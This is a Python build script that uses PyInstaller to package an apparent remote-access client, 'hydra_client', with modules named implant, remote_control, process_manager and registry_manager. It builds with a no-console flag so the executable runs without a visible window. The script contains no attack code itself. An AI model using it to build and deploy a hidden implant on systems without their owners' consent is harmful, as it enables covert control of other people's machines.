import os
import sys
import subprocess

def build():
    """Build the client directly from main.py"""
    print("[*] Starting direct build process...")
    
    # Build with PyInstaller
    print("[*] Running PyInstaller on main.py...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "PyInstaller",
            "--clean",
            "--onefile",
            "--hidden-import=hydra_client.network",
            "--hidden-import=hydra_client.implant",
            "--hidden-import=hydra_client.config",
            "--hidden-import=hydra_client.remote_control",
            "--hidden-import=hydra_client.process_manager",
            "--hidden-import=hydra_client.registry_manager",
            "--noconsole",
            "--name", "hydra_client",
            "main.py"
        ])
        print("[+] Build completed successfully!")
        print("[+] Executable saved as dist/hydra_client.exe")
    except subprocess.CalledProcessError as e:
        print(f"[!] Build failed: {e}")

if __name__ == "__main__":
    build() 